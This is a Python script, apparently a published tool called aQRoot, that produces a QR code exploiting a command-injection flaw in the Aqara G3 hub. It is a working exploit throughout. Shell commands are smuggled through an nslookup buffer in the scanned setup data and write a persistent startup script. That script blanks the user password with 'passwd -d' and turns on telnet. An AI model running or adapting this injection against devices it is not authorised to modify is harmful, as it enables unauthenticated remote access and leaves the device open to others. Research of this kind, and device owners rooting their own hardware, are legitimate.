#!/usr/bin/env python3
import argparse
import segno

__title__ = "aQRoot"
__desc__ = "Enable telnet via qrcode command injection for Aqara G3 hub"
__version__ = "0.3"
__author__ = "Gareth Bryan"
__license__ = "MIT"


def cipher(data):
    out = ""
    for c in data.encode():
        if 32 <= c <= 35:
            out += '%c%c' % (c, c)
        elif c <= 126:
            out += '%c' % (162 - c)
        elif c <= 128:
            out += '#%c' % (165 - c)
        elif c <= 208:
            out += '!%c' % (164 + c & 0xff)
        else:
            out += '"%c' % (83 + c & 0xff)
    return out


def generate_payload(ssid, pwd, payload, post_init):
    """
    qrcode buffer is [1024]
    nslookup sprintf buffer [132]
    "nslookup a;<payload>0x00"
    """
    payload.insert(0, 'a')
    qrcode_data = {
        "b": "\\n".join(post_init),
        "d": ";".join(payload),
        "x": cipher(ssid),
        "y": cipher(pwd),
        "l": "en",
    }
    payload_string = "&".join([f"{k}={v}" for k, v in qrcode_data.items()])
    if len(qrcode_data['d']) > 121:
        raise ValueError(f"Payload (d) exceeds buffer {len(qrcode_data['d'])}/122")
    if len(payload_string) > 1023:
        raise ValueError(f"Payload string exceeds qrcode buffer {len(payload_string)}/1024")
    return payload_string


def gen_qrcode(data, outfile=None):
    qrcode = segno.make(data, error="h")
    qrcode.terminal(compact=True, border=5)
    if outfile:
        qrcode.save(outfile, border=5, scale=8)


def main(args):
    try:
        data = generate_payload(
            ssid=args.ssid,
            pwd=args.pwd,
            payload=[
                'y=/data/scripts/post_init.sh',
                '"fw_man"ager.sh -t -f',
                'echo -e `agetprop persist.app.bind_key`>$y',
                'tail -n2 $y|sh',
            ],
            post_init = [
                '#!/bin/sh',
                'fw_manager.sh -r',
                'passwd -d $USER',
                'fw_manager.sh -t -k'
            ],
        )
        gen_qrcode(data, args.filename)
    except ValueError as e:
        print(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="{} v{}\n{}".format(__title__, __version__, __desc__),
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument(
        "ssid",
        help="Wireless SSID",
    )
    parser.add_argument(
        "pwd",
        help="Wireless Password"
    )
    parser.add_argument(
        "filename",
        nargs="?",
        type=argparse.FileType("wb"),
        help="(Optional) Save QR Code as image",
    )
    args = parser.parse_args()
    main(args)
